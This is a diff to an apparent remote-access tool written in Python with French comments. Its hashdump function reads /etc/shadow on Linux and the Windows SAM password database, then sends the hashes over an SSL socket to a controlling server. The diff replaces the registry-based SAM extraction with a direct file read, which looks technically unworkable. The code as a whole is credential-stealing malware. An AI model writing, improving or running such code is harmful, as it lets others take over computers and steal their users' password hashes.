@@ -5,11 +5,6 @@ import os
 from dotenv import load_dotenv
 from PIL import ImageGrab
 
-import win32security
-import win32con
-import win32api
-from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
-
 SERVER_PORT = 8888
 
 # Fonction permettant d'envoyer la liste des commandes disponibles
@@ -128,21 +123,8 @@ def hashdump(ssl_socket):
         with open('/etc/shadow', 'r') as fichier_shadow:  # Ouverture du fichier shadow
             hashdump_to_send = fichier_shadow.read()  # Lecture du contenu du fichier shadow
     elif os_type == "nt":  # Test si la machine est une Windows
-        try:
-            reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
-            sam = OpenKey(reg, r"SAM\SAM\Domains\Account\Users")
-            
-            hashdump_to_send = ""
-            for i in range(0, win32api.RegQueryInfoKey(sam)[0]):
-                try:
-                    key_name = win32api.RegEnumKey(sam, i)
-                    user_key = OpenKey(sam, key_name)
-                    user_value, _ = QueryValueEx(user_key, "V")
-                    hashdump_to_send += f"{key_name}: {user_value}\n"
-                except Exception as e:
-                    hashdump_to_send += f"Erreur pour {key_name}: {str(e)}\n"
-        except Exception as e:
-            ssl_socket.send(f"Erreur lors de l'accès à la base SAM: {str(e)}".encode())
+        with open('C:/Windows/System32/config/SAM', 'r') as fichier_sam:
+            hashdump_to_send = fichier_sam.read()
     else:
         hashdump_to_send = "OS non reconnu" # Gestion d'erreur
     ssl_socket.send(hashdump_to_send.encode())  # Envoie du fichier hashdump au serveur
